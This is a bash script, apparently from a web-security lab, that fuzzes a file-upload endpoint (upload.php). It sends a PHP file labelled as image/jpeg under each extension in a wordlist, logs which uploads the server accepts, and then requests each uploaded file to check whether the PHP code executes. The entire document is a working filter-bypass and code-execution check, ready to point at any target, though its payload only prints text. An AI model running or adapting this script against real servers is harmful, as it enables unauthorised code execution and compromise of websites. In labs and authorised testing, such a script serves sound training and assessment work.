#!/bin/bash

# Define variables
TARGET_SERVER="<target-IP>:<target-port>"
URL="http://$TARGET_SERVER/upload.php"
PROFILE_URL="http://$TARGET_SERVER/profile_images/"
WORDLIST="web-extensions.txt"
BOUNDARY="----WebKitFormBoundaryhbmrB5pb02aAftR8"
UPLOAD_FILE="myfile"
ALLOWED_EXTENSIONS="allowed_extensions.txt"
TMP_UPLOAD_RESPONSE="upload_response.txt"
TMP_FILE_CONTENT="file_content.txt"

# Clear allowed extensions file
> $ALLOWED_EXTENSIONS

# Function to upload file
upload_file() {
    EXT="$1"
    curl -s -X POST "$URL" \
        -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
        --data-binary @- <<EOF > $TMP_UPLOAD_RESPONSE
--$BOUNDARY
Content-Disposition: form-data; name="uploadFile"; filename="$UPLOAD_FILE$EXT"
Content-Type: image/jpeg

<?php echo "Hello World"; ?>
--$BOUNDARY--
EOF

    # Check if "File successfully uploaded" is in response or size matches
    SIZE=$(wc -c < "$TMP_UPLOAD_RESPONSE")
    if [[ "$SIZE" -eq 229 || "$SIZE" -eq 230 ]] || grep -q "File successfully uploaded" "$TMP_UPLOAD_RESPONSE"; then
        echo "$EXT" >> $ALLOWED_EXTENSIONS
    fi
}

# Loop through the wordlist and fuzz extensions
while read -r EXT; do
    upload_file "$EXT"
done < "$WORDLIST"

# Test allowed extensions for PHP execution
while read -r EXT; do
    curl -s "$PROFILE_URL$UPLOAD_FILE$EXT" -o $TMP_FILE_CONTENT
    
    # Only print success messages if PHP is executed
    if grep -q "Hello World" "$TMP_FILE_CONTENT" && ! grep -q "<?php echo \"Hello World\";" "$TMP_FILE_CONTENT"; then
        echo "Success! PHP executed with extension: $EXT"
    fi
done < "$ALLOWED_EXTENSIONS"

# Clean up temporary files
rm -f $TMP_UPLOAD_RESPONSE $TMP_FILE_CONTENT
